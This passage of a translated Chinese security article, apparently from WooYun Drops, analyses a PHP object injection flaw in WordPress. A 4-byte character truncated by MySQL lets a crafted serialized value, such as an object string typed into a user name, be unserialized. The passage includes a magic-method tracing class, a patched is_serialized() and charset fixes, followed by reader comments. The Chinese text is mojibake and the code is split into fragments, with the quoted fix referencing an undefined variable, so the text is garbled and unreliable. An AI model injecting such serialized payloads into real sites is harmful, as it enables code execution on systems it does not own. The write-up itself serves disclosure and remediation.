æ’å…¥äº†æ•°æ®åº“ã€‚WordPressä¸è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªå·²åºåˆ—åŒ–çš„æ•°æ®ï¼Œå› ä¸ºå®ƒä¸æ˜¯;æˆ–è€…}ç»“å°¾çš„ã€‚å®ƒä¼šè¿”å›</p>
<p>i:1;ğŒ†
ï¼Œå½“æ’å…¥æ•°æ®åº“çš„æ—¶å€™ï¼Œå®ƒçš„å€¼æ˜¯i:1ï¼Œå½“å®ƒä»æ•°æ®åº“å–å›çš„æ—¶å€™ï¼Œå®ƒæœ‰äº†;æœ€ä¸ºæœ€åä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥å®ƒå¯ä»¥è§£åºåˆ—åŒ–æˆåŠŸã€‚ç¢‰å ¡äº†ã€‚æ¼æ´ã€‚</p>
<h2 id="0x02-wordpress-">0x02 WordPress åˆ©ç”¨</h2>
<p>ç°åœ¨æˆ‘ä»¬å±•ç¤ºäº†WordPresså­˜åœ¨PHPå¯¹è±¡æ³¨å…¥æ¼æ´ã€‚è®©æˆ‘ä»¬å°è¯•åˆ©ç”¨å®ƒã€‚æ‰€ä»¥ä¸ºäº†åˆ©ç”¨è¯¥æ¼æ´ï¼ˆé€šè¿‡æ³¨å…¥å¯¹è±¡çš„æ–¹æ³•ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç¬¦åˆä»¥ä¸‹æ¡ä»¶çš„classï¼š</p>
<p>1ï¼Œå†…æœ‰â€œæœ‰ç”¨â€çš„æ–¹æ³•å¯è¢«è°ƒç”¨ã€‚
2ï¼Œå­˜åœ¨è¯¥å¯¹è±¡çš„ç±»å·²ç»è¢«åŒ…å«äº†ã€‚</p>
<p>å½“ä¸€ä¸ªå¯¹è±¡è¢«è§£åºåˆ—åŒ–çš„æ—¶å€™ï¼Œ__wakeupå‡½æ•°ä¼šè¢«è°ƒç”¨ï¼Œè¿™è¢«ç§°ä½œPHPçš„é­”æœ¯æ–¹æ³•ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬ç¡®å®šä¼šè¢«è°ƒç”¨çš„æ–¹æ³•ï¼Œå®é™…ä¸Šè¿™äº›å‡½æ•°ä¼šæ›´å¤šå†™äº›ï¼Œæˆ‘å†™äº†ä¸€ä¸ªä»¥ä¸‹çš„classæ¥è·å–è¢«è°ƒç”¨çš„classåˆ°/tmp/fumc.logã€‚
1</p>
<p>2
3</p>
<p>4
5</p>
<p>6
7</p>
<p>8
9</p>
<p>10
11</p>
<p>12
13</p>
<p>14
15</p>
<p>16
17</p>
<p>18
19</p>
<p>20
21</p>
<p>22
23&lt;?php</p>
<p>class</p>
<p>Foo {</p>
<p>public</p>
<p>static</p>
<p>function</p>
<p>logFuncCall(</p>
<p>$funcName</p>
<p>) {</p>
<p>$fh</p>
<p>=</p>
<p>fopen</p>
<p>(</p>
<p>&#39;/tmp/func.log&#39;</p>
<p>,</p>
<p>&#39;a&#39;</p>
<p>);</p>
<p>fwrite(</p>
<p>$fh</p>
<p>,</p>
<p>$funcName</p>
<p>.</p>
<p>&quot;\n&quot;</p>
<p>);</p>
<p>fclose(</p>
<p>$fh</p>
<p>);</p>
<p>}</p>
<p>public</p>
<p>function</p>
<p>__construct() { Foo::logFuncCall(</p>
<p>&#39;__construct(&#39;</p>
<p>.json_encode(func_get_args()).</p>
<p>&#39;)&#39;</p>
<p>);}</p>
<p>public</p>
<p>function</p>
<p>__destruct() { Foo::logFuncCall(</p>
<p>&#39;__destruct()&#39;</p>
<p>);}</p>
<p>public</p>
<p>function</p>
<p>__get(</p>
<p>$name</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__get($name)&quot;</p>
<p>);</p>
<p>return</p>
<p>&quot;Foo&quot;</p>
<p>;}</p>
<p>public</p>
<p>function</p>
<p>__set(</p>
<p>$name</p>
<p>,</p>
<p>$value</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__set($name, value)&quot;</p>
<p>);}</p>
<p>public</p>
<p>function</p>
<p>__isset(</p>
<p>$name</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__isset($name)&quot;</p>
<p>);</p>
<p>return</p>
<p>true;}</p>
<p>public</p>
<p>function</p>
<p>__unset(</p>
<p>$name</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__unset($name)&quot;</p>
<p>);}</p>
<p>public</p>
<p>function</p>
<p>__sleep() { Foo::logFuncCall(</p>
<p>&quot;__sleep()&quot;</p>
<p>);</p>
<p>return</p>
<p>array</p>
<p>();}</p>
<p>public</p>
<p>function</p>
<p>__wakeup() { Foo::logFuncCall(</p>
<p>&quot;__wakeup()&quot;</p>
<p>);}</p>
<p>public</p>
<p>function</p>
<p>__toString() { Foo::logFuncCall(</p>
<p>&quot;__toString()&quot;</p>
<p>);</p>
<p>return</p>
<p>&quot;Foo&quot;</p>
<p>;}</p>
<p>public</p>
<p>function</p>
<p>__invoke(</p>
<p>$a</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__invoke(&quot;</p>
<p>. json_encode(func_get_args()).</p>
<p>&quot;)&quot;</p>
<p>);}</p>
<p>public</p>
<p>function</p>
<p>__call(</p>
<p>$a</p>
<p>,</p>
<p>$b</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__call(&quot;</p>
<p>. json_encode(func_get_args()).</p>
<p>&quot;)&quot;</p>
<p>);}</p>
<p>public</p>
<p>static</p>
<p>function</p>
<p>__callStatic(</p>
<p>$a</p>
<p>,</p>
<p>$b</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__callStatic(&quot;</p>
<p>. json_encode(func_get_args()).</p>
<p>&quot;)&quot;</p>
<p>);}</p>
<p>public</p>
<p>static</p>
<p>function</p>
<p>__set_state(</p>
<p>$a</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__set_state(&quot;</p>
<p>. json_encode(func_get_args()).</p>
<p>&quot;)&quot;</p>
<p>);</p>
<p>return</p>
<p>null;}</p>
<p>public</p>
<p>function</p>
<p>__clone() { Foo::logFuncCall(</p>
<p>&quot;__clone()&quot;</p>
<p>);}</p>
<p>}
?&gt;</p>
<p>ä¸ºäº†åˆ—å‡ºè¿™äº›è¢«è°ƒç”¨çš„å‡½æ•°ï¼Œé¦–å…ˆè¦ç¡®è®¤è¿™ä¸ªå‡½æ•°åœ¨è§£åºåˆ—åŒ–å‘ç”Ÿçš„æ—¶å€™æ˜¯è¢«å¼•å…¥è¢«åŒ…å«è¿‡çš„ï¼ˆphpä¸­çš„include requireç­‰ï¼‰ã€‚ä½ å¯ä»¥æŠŠrequire_once(&#39;foo.php&#39;)åŠ åˆ°functions.phpçš„é¡¶ç«¯ã€‚æ¥ä¸‹æ¥ï¼ŒæŠŠåå­—æ”¹ä¸ºO:3:&quot;Foo&quot;:0:{}ğŒ†æ¥å°è¯•åˆ©ç”¨è¿™ä¸ªPHPå¯¹è±¡æ³¨å…¥æ¼æ´ï¼Œå½“åˆ·æ–°é¡µé¢åï¼Œä½ å›çœ‹åˆ°ä½ çš„åå­—å˜æˆäº†Fooï¼Œè¿™ä¹Ÿå°±æ˜¯æ„å‘³ç€è¿™æ˜¯ä¸Šé¢é‚£classä¸­__toString()å‡½æ•°çš„è¿”å›ï¼Œç„¶åè®©æˆ‘ä»¬çœ‹çœ‹éƒ½æœ‰å“ªäº›å‡½æ•°è¢«è°ƒç”¨äº†ã€‚</p>
<p>$ sort -u /tmp/func.log <strong>destruct() </strong>toString() __wakeup()</p>
<p>ç»™å‡ºäº†æˆ‘ä»¬ä¸‰ä¸ªå‡½æ•°ï¼š<strong>wakeup(), </strong>destruct() å’Œ __toString()</p>
<p>å¾ˆä¸å¹¸çš„æ˜¯æˆ‘ä¸èƒ½å†WordPressä¸­æ‰¾åˆ°ä¸€ä¸ªè½½å…¥äº†å¹¶ä¸”è§£åºåˆ—åŒ–æ—¶èƒ½è¢«åˆ©ç”¨é€ æˆå½±å“çš„ç±»ã€‚æ‰€ä»¥ä¸æ˜¯ä¸€ä¸ªWordPressçš„å®‰å…¨é—®é¢˜ï¼Œè€Œæ˜¯ä¸€ä¸ªå¯èƒ½åˆ©ç”¨çš„åœ°æ–¹ã€‚</p>
<p>æ‰€ä»¥æ˜¯ä¸æ˜¯WordPressæ˜¯æœ‰å®‰å…¨éšæ‚£çš„ï¼Œä½†æ˜¯æ— æ³•è¢«åˆ©ç”¨ï¼Ÿä¸ä¸€å®šï¼Œå¦‚æœä½ ç†Ÿæ‚‰WordPressï¼Œä½ å¯èƒ½ä¼šè§‰å¯Ÿåˆ°å¯èƒ½æœ‰ä¸€å †æ’ä»¶å­˜åœ¨æ¼æ´ã€‚è¿™äº›æ’ä»¶æœ‰ä»–ä»¬è‡ªå·±çš„ç±»å¹¶ä¸”å¯èƒ½æš´éœ²å‡ºå¯è¢«åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚æˆ‘æƒ³åˆ°è¿™ä¸ªåï¼Œå·²ç»å‘ç°äº†ä¸€æ¬¾è‘—åçš„æ’ä»¶å­˜åœ¨æ¼æ´å¹¶ä¸”å¯ä»¥å¯¼è‡´è¿œç¨‹ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<p>ç”±äºé“å¾·è€ƒè™‘ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä¸ä¼šå‘å¸ƒPoCçš„ï¼Œæœ‰å¤ªå¤šå­˜åœ¨å®‰å…¨æ¼æ´çš„WordPressäº†ã€‚</p>
<h2 id="0x03-wordpress">0x03 ä¿®å¤WordPress</h2>
<p>è¿™ä¸ªä¿®å¤æ–¹å¼æ˜¯ä¿®æ”¹is_serializedå‡½æ•°ï¼Œæˆ‘ç®€å•çš„è¯´è¯´ï¼š
1</p>
<p>2
3</p>
<p>4
5</p>
<p>6
7</p>
<p>8
9</p>
<p>10
11</p>
<p>12
13</p>
<p>14
15</p>
<p>16
17</p>
<p>18
19</p>
<p>20
21</p>
<p>22
23</p>
<p>24
25</p>
<p>26
27</p>
<p>28
29</p>
<p>30
31</p>
<p>32
33</p>
<p>34
35function</p>
<p>is_serialized(</p>
<p>$data</p>
<p>,</p>
<p>$strict</p>
<p>= true ) {</p>
<p>// å¦‚æœä¸æ˜¯å­—ç¬¦ä¸²å°±ä¸ä¼šæ˜¯åºåˆ—åŒ–åçš„æ•°æ®</p>
<p>if</p>
<p>( !</p>
<p>is_string</p>
<p>(</p>
<p>$data</p>
<p>) )</p>
<p>return</p>
<p>false;</p>
<p>if</p>
<p>(</p>
<p>&#39;:&#39;</p>
<p>!==</p>
<p>$data</p>
<p>[1] )</p>
<p>return</p>
<p>false;</p>
<p>if</p>
<p>(</p>
<p>$strict</p>
<p>) {</p>
<p>$lastc</p>
<p>=</p>
<p>$data</p>
<p>[</p>
<p>$length</p>
<ul>
<li>1 ];</li>
</ul>
<p>if</p>
<p>(</p>
<p>&#39;;&#39;</p>
<p>!==</p>
<p>$lastc</p>
<p>&amp;&amp;</p>
<p>&#39;}&#39;</p>
<p>!==</p>
<p>$lastc</p>
<p>)</p>
<p>return</p>
<p>false;</p>
<p>}</p>
<p>else</p>
<p>{</p>
<p>//ç¡®è®¤å­˜åœ¨;æˆ–}ä½†ä¸æ˜¯åœ¨ç¬¬ä¸€ä¸ªå­—ç¬¦</p>
<p>if</p>
<p>(</p>
<p>strpos</p>
<p>(</p>
<p>$data</p>
<p>,</p>
<p>&#39;;&#39;</p>
<p>) &lt; 3 &amp;&amp;</p>
<p>strpos</p>
<p>(</p>
<p>$data</p>
<p>,</p>
<p>&#39;}&#39;</p>
<p>) &lt; 4 )</p>
<p>return</p>
<p>false;</p>
<p>}</p>
<p>$token</p>
<p>=</p>
<p>$data</p>
<p>[0];</p>
<p>switch</p>
<p>(</p>
<p>$token</p>
<p>) {</p>
<p>case</p>
<p>&#39;s&#39;</p>
<p>:</p>
<p>if</p>
<p>(</p>
<p>$strict</p>
<p>) {</p>
<p>if</p>
<p>(</p>
<p>&#39;&quot;&#39;</p>
<p>!==</p>
<p>$data</p>
<p>[</p>
<p>$length</p>
<ul>
<li>2 ] )</li>
</ul>
<p>return</p>
<p>false;</p>
<p>}</p>
<p>elseif</p>
<p>( false ===</p>
<p>strpos</p>
<p>(</p>
<p>$data</p>
<p>,</p>
<p>&#39;&quot;&#39;</p>
<p>) ) {</p>
<p>return</p>
<p>false;</p>
<p>}</p>
<p>case</p>
<p>&#39;a&#39;</p>
<p>:</p>
<p>case</p>
<p>&#39;O&#39;</p>
<p>:</p>
<p>return</p>
<p>(bool) preg_match(</p>
<p>&quot;/^{$token}:[0-9]+:/s&quot;</p>
<p>,</p>
<p>$data</p>
<p>);</p>
<p>case</p>
<p>&#39;b&#39;</p>
<p>:</p>
<p>case</p>
<p>&#39;i&#39;</p>
<p>:</p>
<p>case</p>
<p>&#39;d&#39;</p>
<p>:</p>
<p>$end</p>
<p>=</p>
<p>$strict</p>
<p>?</p>
<p>&#39;$&#39;</p>
<p>:</p>
<p>&#39;&#39;</p>
<p>;</p>
<p>return</p>
<p>(bool) preg_match(</p>
<p>&quot;/^{$token}:[0-9.E-]+;$end/&quot;</p>
<p>,</p>
<p>$data</p>
<p>);</p>
<p>}</p>
<p>return</p>
<p>false;</p>
<p>}</p>
<p>è¿™ä¸»è¦çš„åŒºåˆ«æ˜¯å½“$strictå‚æ•°è®¾ç½®ä¸ºfalseçš„æ—¶å€™ï¼Œä¼šæœ‰ä¸€äº›å¼ºåˆ¶æ“ä½œå¯¼è‡´ä¸€ä¸ªå­—ç¬¦ä¸²è¢«æ ‡è®°ä¸ºå·²åºåˆ—åŒ–ã€‚ä¸¾ä¾‹è¯´æ˜ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦ä¸éœ€è¦å¿…é¡»æ˜¯;æˆ–è€…{ï¼ˆè¯‘è€…æ³¨ï¼šä½œè€…æ­¤å¤„åº”è¯¥ç¬”è¯¯äº†ï¼Œåº”è¯¥æ˜¯;æˆ–è€…}),ä¿®å¤äº†æˆ‘æ‰€æäº¤çš„æ¼æ´ã€‚ç°åœ¨å¤§å®¶æœ‰æ²¡æœ‰ç›¸ä¼¼çš„å†…å®¹å¯ä»¥æ‹¿å‡ºæ¥åšä¸ªè®¨è®ºçš„ï¼Ÿ</p>
<p>WordPressä¾æ—§ä½¿ç”¨ç€ä¸å®‰å…¨çš„unserialize()è€Œéå®‰å…¨çš„json_decodeã€‚å®ƒçš„å®‰å…¨æ€§å…¨åœ¨åˆ¤æ–­è§„åˆ™æˆ–è€…Mysqlçš„è§„åˆ™å®ç°ä¸Šã€‚æˆ‘åœ¨ä¸Šé¢æ­éœ²çš„æ¼æ´å®é™…ä¸Šæ˜¯ä½¿ç”¨Mysqlçš„è§„åˆ™å»æ‰æˆ‘è·Ÿåœ¨ç‰¹æ®Šç¬¦å·åçš„æ‰€æœ‰å­—ç¬¦ã€‚</p>
<p>æœ‰ä¸€ä¸ªå¾ˆç®€æ´çš„ä¿®å¤æ–¹æ¡ˆï¼Œä¿®æ”¹ä¸€ä¸‹æ•°æ®åº“ç¼–ç ä¸è¢«æˆªæ–­å°±å¥½ï¼š
ALTER TABLE wp_commentmeta CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; ALTER TABLE wp_postmeta CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; ALTER TABLE wp_usermeta CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
ç‰ˆæƒå£°æ˜ï¼šæœªç»æˆæƒç¦æ­¢è½¬è½½ <a href="http://drops.wooyun.org/author/äº”é“å£æ€æ°”" title="ç”± äº”é“å£æ€æ°” å‘å¸ƒ" target="_blank">äº”é“å£æ€æ°”</a>@<a href="http://drops.wooyun.org/" target="_blank">ä¹Œäº‘çŸ¥è¯†åº“</a>
åˆ†äº«åˆ°ï¼š <a href="&quot;åˆ†äº«åˆ°QQç©ºé—´&quot;"></a> <a href="&quot;åˆ†äº«åˆ°æ–°æµªå¾®åš&quot;"></a> <a href="&quot;åˆ†äº«åˆ°è…¾è®¯å¾®åš&quot;"></a> <a href="&quot;åˆ†äº«åˆ°äººäººç½‘&quot;"></a> <a href="&quot;åˆ†äº«åˆ°ç½‘æ˜“å¾®åš&quot;"></a> <a href="&quot;ç´¯è®¡åˆ†äº«2æ¬¡&quot;">2</a></p>
<h3 id="-">ç›¸å…³æ—¥å¿—</h3>
<ul>
<li><a href="http://drops.wooyun.org/papers/61" target="_blank">åˆ†æä¸‹éš¾å¾—ä¸€è§çš„RORçš„RCEï¼ˆCVEï¼2013ï¼0156ï¼‰</a></li>
<li><a href="http://drops.wooyun.org/tips/347" target="_blank">æ”»å‡»JavaWebåº”ç”¨[5]-MVCå®‰å…¨</a></li>
<li><a href="http://drops.wooyun.org/tips/236" target="_blank">æ”»å‡»JavaWebåº”ç”¨[3]-SQLæ³¨å…¥[1]</a></li>
<li><a href="http://drops.wooyun.org/tips/688" target="_blank">Flash CSRF</a></li>
<li><a href="http://drops.wooyun.org/tips/127" target="_blank">æµ…è°ˆäº’è”ç½‘ä¸­åŠ«æŒçš„ä¸€äº›äº‹æƒ…</a></li>
<li><a href="http://drops.wooyun.org/tips/135" target="_blank">PHPå®‰å…¨ç¼–ç </a>
ä¸Šä¸€ç¯‡:<a href="http://drops.wooyun.org/papers/576" target="_blank">è€å¤–çš„ä¸€ä»½æ¸—é€æµ‹è¯•æŠ¥å‘Š</a></li>
</ul>
<p>ä¸‹ä¸€ç¯‡:<a href="http://drops.wooyun.org/papers/384" target="_blank">å¯¹æŸåˆ›æ–°è·¯ç”±çš„å®‰å…¨æµ‹è¯•</a></p>
<h3 id="-18-rss-2-0-http-drops-wooyun-org-papers-596-feed-trackback-http-drops-wooyun-org-papers-596-trackback-">æ¥¼è¢«æŠ¢äº† 18 å±‚äº†... <a href="">æŠ¢åº§</a>ã€<a href="http://drops.wooyun.org/papers/596/feed" target="_blank">Rss 2.0</a>æˆ–è€… <a href="http://drops.wooyun.org/papers/596/trackback" target="_blank">Trackback</a></h3>
<ul>
<li><img src="" alt=""> å›­é•¿ | 2013/09/13 11:36 | <a href="">/#</a></li>
</ul>
<p>æ²™å‘ï¼Ÿ</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> ccSec | 2013/09/13 11:51 | <a href="">/#</a></li>
</ul>
<p>å¤ªæ¼‚äº®äº†ï¼</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> erevus | 2013/09/13 11:51 | <a href="">/#</a></li>
</ul>
<p>é‚£æˆ‘è¿™æ˜¯åœ°æ¿</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> RuIg | 2013/09/13 11:57 | <a href="">/#</a></li>
</ul>
<p>good job man!</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> 0x334 | 2013/09/13 11:59 | <a href="">/#</a></li>
</ul>
<p>é¡¶ï¼ŒèŠ‚æ“ã€‚</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> BlackWidow7 | 2013/09/13 13:31 | <a href="">/#</a></li>
</ul>
<p>æ€æ°”ã€‚æ—¥</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> insight-labs | 2013/09/13 14:08 | <a href="">/#</a></li>
</ul>
<p>æ€æ°”å¤ªé‡äº†â€¦â€¦
åˆè¦å€’ä¸‹ä¸€ç‰‡äº†</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> horseluke | 2013/09/13 16:39 | <a href="">/#</a></li>
</ul>
<p>unserializeä¸€ç›´éƒ½æ˜¯å¤§å‘ï¼Œä½†æ‚²å‰§çš„æ˜¯æŸäº›åœºæ™¯è¿˜æ˜¯å¾—è¦ç”¨å®ƒï¼Œæ¯”å¦‚æ–‡ä»¶ç¼“å­˜......</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> MEng | 2013/09/13 20:15 | <a href="">/#</a></li>
</ul>
<p>é«˜å¯Œå¸…!</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> Ivan | 2013/09/13 22:57 | <a href="">/#</a></li>
</ul>
<p>pocå•Špoc</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> s3cur1ty | 2013/09/16 10:23 | <a href="">/#</a></li>
</ul>
<p>s:4:&quot;i:1;&quot;;å‹æ ¹å°±æ²¡å†æ•°æ®åº“é‡Œå‡ºç°è¿‡ã€‚ã€‚ã€‚ã€‚</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> Sct7p | 2013/09/16 13:06 | <a href="">/#</a></li>
</ul>
<p>good job</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> s3cur1ty | 2013/09/16 13:14 | <a href="">/#</a></li>
</ul>
<p>function is_serialized( $data ) {
// if it isn&#39;t a string, it isn&#39;t serialized
if ( ! is_string( $data ) )
return false;
$data = trim( $data );
if ( &#39;N;&#39; == $data )
return true;
$length = strlen( $data );
if ( $length &lt; 4 )
return false;
if ( &#39;:&#39; !== $data[1] )
return false;
$lastc = $data[$length-1];
if ( &#39;;&#39; !== $lastc &amp;&amp; &#39;}&#39; !== $lastc )
return false;
$token = $data[0];
switch ( $token ) {
case &#39;s&#39; :
if ( &#39;&quot;&#39; !== $data[$length-2] )
return false;
case &#39;a&#39; :
case &#39;O&#39; :
return (bool) preg_match( &quot;/^{$token}:[0-9]+:/s&quot;, $data );
case &#39;b&#39; :
case &#39;i&#39; :
case &#39;d&#39; :
return (bool) preg_match( &quot;/^{$token}:[0-9.E-]+;\$/&quot;, $data );
}
return false;
}</p>
<p>éš¾é“æ¥¼ä¸»æ²¡æœ‰çœ‹åˆ°if ( $length &lt; 4 ) return false;
<a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> Ray | 2013/09/24 17:12 | <a href="">/#</a></li>
</ul>
<p>æˆ‘ä¼°è®¡å•Šï¼Œæ˜¯ä½œè€…ç¿»è¯‘çš„æ—¶å€™ç¿»ç€ç¿»ç€æŠŠi:1;å†™æˆäº†i:1ï¼Œè€Œi:1;æ­£å¥½æ˜¯4ä¸ªå­—èŠ‚ã€‚</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> é¾™è‡£ | 2013/09/16 16:21 | <a href="">/#</a></li>
</ul>
<p>holy shit</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> é½è¿¹ | 2013/09/17 17:57 | <a href="">/#</a></li>
</ul>
<p>å¼±å¼±çš„é—®ä¸€ä¸‹ åªæœ‰åœ¨ç”¨äº†__toString è¿™ä¸ªé­”æœ¯æ–¹æ³•çš„æ—¶å€™æ‰èƒ½å¤Ÿè§¦å‘å—ï¼Ÿ</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> lhshaoren | 2013/09/24 17:05 | <a href="">/#</a></li>
</ul>
<p>è†œæ‹œ</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> Forever80s | 2013/10/08 22:01 | <a href="">/#</a></li>
</ul>
<p>wordpressæ¡†æ¶è¦æ˜¯èƒ½æ‰¾å‡ºæ¥æ¼æ´ï¼Œä½ å°±å‘äº†ã€‚ã€‚ã€‚</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<h3 id="-">å‘è¡¨è¯„è®º</h3>
<p><a href="">ç‚¹å‡»è¿™é‡Œå–æ¶ˆå›å¤ã€‚</a></p>
<p>æ‚¨å¿…é¡» <a href="http://drops.wooyun.org/login" target="_blank">ç™»é™†</a> åæ‰èƒ½å‘è¡¨è¯„è®ºã€‚</p>
<h3 id="-">è®¢é˜…æ›´æ–°</h3>
<ul>
<li><a href="http://drops.wooyun.org/feed" title="ç‚¹å‡»è®¢é˜…" target="_blank"><img src="" alt=""></a></li>
</ul>
<h3 id="-">åˆ†ç±»</h3>
<ul>
<li><a href="http://drops.wooyun.org/category/papers" title="æ¼æ´åˆ†æ" target="_blank">æ¼æ´åˆ†æ</a> (40)</li>
<li><a href="http://drops.wooyun.org/category/tips" title="æŠ€æœ¯åˆ†äº«" target="_blank">æŠ€æœ¯åˆ†äº«</a> (57)</li>
<li><a href="http://drops.wooyun.org/category/tools" title="å·¥å…·æ”¶é›†" target="_blank">å·¥å…·æ”¶é›†</a> (5)</li>
<li><p><a href="http://drops.wooyun.org/category/news" title="ä¸šç•Œèµ„è®¯" target="_blank">ä¸šç•Œèµ„è®¯</a> (3)</p>
<h3 id="-">æœ€æ–°æ—¥å¿—</h3>
</li>
<li><p><a href="http://drops.wooyun.org/tips/688" title="Flash CSRF" target="_blank">Flash CSRF</a></p>
</li>
<li><a href="http://drops.wooyun.org/tips/689" title="XSSä¸å­—ç¬¦ç¼–ç çš„é‚£äº›äº‹å„¿ â€”ç§‘æ™®æ–‡" target="_blank">XSSä¸å­—ç¬¦ç¼–ç çš„é‚£äº›äº‹å„¿ â€”ç§‘æ™®æ–‡</a></li>
<li><a href="http://drops.wooyun.org/papers/680" title="Zabbix SQL Injection/RCE â€“ CVE-2013-5743" target="_blank">Zabbix SQL Injection/RCE â€“ CVE-2013-5743</a></li>
<li><a href="http://drops.wooyun.org/papers/679" title="CDNæµé‡æ”¾å¤§æ”»å‡»æ€è·¯" target="_blank">CDNæµé‡æ”¾å¤§æ”»å‡»æ€è·¯</a></li>
<li><a href="http://drops.wooyun.org/news/674" title="ä»ä¸ç»¸ä¹‹è·¯åˆ°å®‰å…¨è¿ç»´ï¼ˆOperational Securityï¼‰ä¸é£é™©æ§åˆ¶ï¼ˆRisk Managementï¼‰ ä¸Šé›†" target="_blank">ä»ä¸ç»¸ä¹‹è·¯åˆ°å®‰å…¨è¿ç»´ï¼ˆOperational Securityï¼‰ä¸é£é™©æ§åˆ¶ï¼ˆRisk Managementï¼‰ ä¸Šé›†</a></li>
<li><a href="http://drops.wooyun.org/tips/662" title="æ”»å‡»JavaWebåº”ç”¨[8]-åé—¨ç¯‡" target="_blank">æ”»å‡»JavaWebåº”ç”¨[8]-åé—¨ç¯‡</a></li>
<li><a href="http://drops.wooyun.org/papers/660" title="php4fun.sinaapp.com PHPæŒ‘æˆ˜é€šå…³æ”»ç•¥" target="_blank">php4fun.sinaapp.com PHPæŒ‘æˆ˜é€šå…³æ”»ç•¥</a></li>
<li><a href="http://drops.wooyun.org/papers/653" title="æ­å»ºåŸºäºSuricata+Barnyard2+Baseçš„IDSå‰ç«¯Snorby" target="_blank">æ­å»ºåŸºäºSuricata+Barnyard2+Baseçš„IDSå‰ç«¯Snorby</a></li>
<li><a href="http://drops.wooyun.org/tools/655" title="GPUç ´è§£ç¥å™¨Hashcatä½¿ç”¨ç®€ä»‹" target="_blank">GPUç ´è§£ç¥å™¨Hashcatä½¿ç”¨ç®€ä»‹</a></li>
<li><a href="http://drops.wooyun.org/tips/649" title="å†…ç½‘æ¸—é€åº”ç”¨ è·¨vlanæ¸—é€çš„ä¸€ç§æ€è·¯" target="_blank">å†…ç½‘æ¸—é€åº”ç”¨ è·¨vlanæ¸—é€çš„ä¸€ç§æ€è·¯</a></li>
</ul>
<h3 id="-">æœ€æ–°è¯„è®º</h3>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>c2y2 åœ¨ <a href="http://drops.wooyun.org/tips/689#comment-1883" target="_blank">XSSä¸å­—ç¬¦ç¼–ç çš„é‚£äº›äº‹å„¿ ---ç§‘æ™®æ–‡</a>
è°¢è°¢</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>Evi1c0de åœ¨ <a href="http://drops.wooyun.org/tips/573#comment-1877" target="_blank">å¦‚ä½•ç”¨æ„å¿µè·å–é™„è¿‘ç¾å¥³çš„æ‰‹æœºå·ç </a>
è¿æ¥CMCCè·³è½¬åˆ°ç™»é™†é¡µé¢ å³é”®æºç  ä¿®æ”¹å³å¯</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>ç‰›ç‰› åœ¨ <a href="http://drops.wooyun.org/tips/688#comment-1871" target="_blank">Flash CSRF</a>
æ”¯æŒä¸€ä¸‹å‘µå‘µ</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>luwikes åœ¨ <a href="http://drops.wooyun.org/papers/178#comment-1870" target="_blank">JBosså®‰å…¨é—®é¢˜æ€»ç»“</a>
mark</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>NgInx åœ¨ <a href="http://drops.wooyun.org/tips/688#comment-1869" target="_blank">Flash CSRF</a>
